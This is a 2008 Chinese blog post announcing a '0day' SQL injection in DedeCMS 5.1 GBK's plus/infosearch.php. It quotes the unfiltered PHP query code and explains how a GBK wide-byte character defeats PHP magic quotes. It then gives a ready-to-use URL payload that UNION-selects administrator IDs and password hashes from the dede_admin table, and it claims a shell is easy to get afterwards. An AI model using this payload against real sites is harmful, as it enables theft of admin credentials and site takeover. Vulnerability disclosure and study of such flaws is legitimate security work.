---
title: DeDecms 5.1 gbk版0day
description: 一个月前看了看了DeDecms5.1gbk代码（只看了plus下的文件），发现有些变量人为控制没有过滤，但是在php的魔法引号这道天然屏障面前利用几率不好,但是联想到gbk的宽字符，突破方法就有了。
date: 2008-11-15 12:02:28
category: 漏洞信息
tags: ['DeDecms', '0day']
post_id: 681
alias: DeDecms-5.1-gbk-0day
ViewNums: 3949
---

一个月前看了看了**[DeDecms 5.1 gbk](/blog/dedecms-51-gbk-0day)**代码（只看了plus下的文件），发现有些变量人为控制没有过滤，但是在php的魔法引号这道天然屏障面前利用几率不好,但是联想到gbk的宽字符，突破方法就有了。

漏洞文件：plus/infosearch.php

测试版本：DeDecms 5.1 gbk

描述：$q变量没有过滤直接进入查询，导致注入出现。代码如下：

PHP代码

$q = trim($q);
if($areaid > 0) {
$wheresql = "areaid=$areaid and ";
}

$query = "select ID,typeid,title,memberID,writer,senddate from #@__infos where $wheresql title like '%$q%' order by senddate desc";

$dlist = new DataList();

$dlist->pageSize = 20;
$dlist->SetParameter("q",$q);
$dlist->SetParameter("action",'search');
$dlist->SetParameter("areaid",$areaid);
$dlist->SetSource($query);“‘”突破了，那就照常注入。

测试站：
http://www.xxx.com/plus/infosearch.php?action=search&q=%cf'%20union%20select%201,2,id,4,pwd,6%20from%20dede_admin/*

至于后台拿shell,找不到后台的一样可以轻松拿到shell。

还有几个文件存在注入问题，象feedback.php,后续发放分析。

From:<http://www.tojen.cn/news/20080110822..html>

